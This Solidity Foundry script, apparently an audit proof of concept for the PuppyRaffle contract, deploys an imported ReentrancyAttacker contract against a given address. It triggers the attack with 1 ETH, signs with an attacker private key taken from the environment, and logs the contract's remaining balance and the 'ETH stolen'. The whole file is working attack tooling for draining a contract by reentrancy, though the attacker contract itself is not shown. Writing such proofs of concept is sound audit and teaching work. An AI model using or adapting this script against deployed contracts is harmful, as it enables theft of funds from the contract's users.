// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Script, console} from "forge-std/Script.sol";
import {ReentrancyAttacker} from "../src/ReentrancyAttacker.sol";

contract AttackReentrancy is Script {
    function run(address puppyRaffleAddress) external payable {
        uint256 attackerPrivateKey = vm.envUint("ATTACKER_KEY");

        vm.startBroadcast(attackerPrivateKey);

        // Deploy the malicious attacker contract
        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffleAddress);

        // Trigger the attack — send exactly 1 entrance fee (1 ETH)
        attacker.attack{value: 1 ether}();

        vm.stopBroadcast();

        // Show the damage
        console.log("======= ATTACK COMPLETE =======");
        console.log("Contract ETH left :", puppyRaffleAddress.balance);
        console.log("Attacker ETH stolen:", address(attacker).balance);
        console.log("================================");
    }
}
